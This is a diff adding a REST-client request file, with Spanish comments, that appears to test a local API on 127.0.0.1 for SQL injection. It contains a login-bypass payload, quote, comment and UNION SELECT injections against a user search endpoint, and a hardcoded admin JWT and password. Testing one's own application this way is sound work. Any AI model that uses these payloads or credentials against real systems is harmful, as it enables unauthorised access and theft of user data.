@@ -1,0 +1,40 @@
+@token_admin= eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJ0eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzcwNjk3Mzc0LCJpYXQiOjE3NzA2OTU1NzQsInVzZXJuYW1lIjoiYWRtaW4ifQ.Zsd5k-_S2AoYcC36VZLvA4eNZhRnsRTVA_zIuCzXgfs
+
+### Intento de SQL Injection en Login
+POST http://127.0.0.1:8000/auth/login_user/
+Content-Type: application/json
+
+{
+  "username": "admin' OR '1'='1",
+  "password": "anything' OR '1'='1"
+}
+
+
+
+### Obtener token válido
+POST http://127.0.0.1:8000/auth/login_user/
+Content-Type: application/json
+
+{
+  "username": "admin",
+  "password": "admin123"
+}
+
+### Guardar el token que viene en la respuesta y usarlo aquí:
+
+### PASO 2: Búsqueda normal (control)
+GET http://127.0.0.1:8000/api/users/?search=jona
+Authorization: Bearer {{token_admin}}
+
+### PASO 3: SQL Injection con comillas
+GET http://127.0.0.1:8000/api/users/?search=jona' OR '1'='1
+Authorization: Bearer {{token_admin}}
+
+### PASO 4: SQL Injection con comentario
+GET http://127.0.0.1:8000/api/users/?search=jona' --
+Authorization: Bearer {{token_admin}}
+### Intento de SQL Injection con UNION
+
+### PASO 5: SQL Injection con UNION
+GET http://127.0.0.1:8000/api/users/?search=jona' UNION SELECT id,username FROM auth_user --
+Authorization: Bearer {{token_admin}}
